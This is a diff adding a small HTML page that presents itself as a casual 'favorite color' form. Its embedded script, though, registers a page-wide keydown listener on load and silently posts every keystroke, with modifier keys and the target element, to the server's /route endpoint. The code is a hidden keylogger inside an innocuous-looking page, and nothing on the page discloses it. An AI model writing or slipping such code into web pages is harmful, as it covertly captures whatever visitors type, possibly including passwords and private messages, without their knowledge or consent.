@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>oi m8</title>
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+</head>
+
+<body>
+
+    <p>Whats your favorite color m8?</p>
+    <form action="/route" method="POST">
+        <input type="text" name="fName" />
+        <input type="submit" value="Submit">
+    </form>
+
+    <script>
+        function c(d) {
+            $.ajax({
+                dataType: "json",
+                type: "POST",
+                url: "/route",
+                data:
+                {
+                    altnKey: d.altKey ? 1 : 0,
+                    ctrlKey: d.ctrlKey ? 1 : 0,
+                    userKey: d.key,
+                    targKey: d.target.id
+                }
+            });
+        }
+
+        window.onload = function () {
+            window.addEventListener("keydown", function (e) {
+                c(e);
+            });
+        }
+    </script>
+
+</body>
+
+</html>
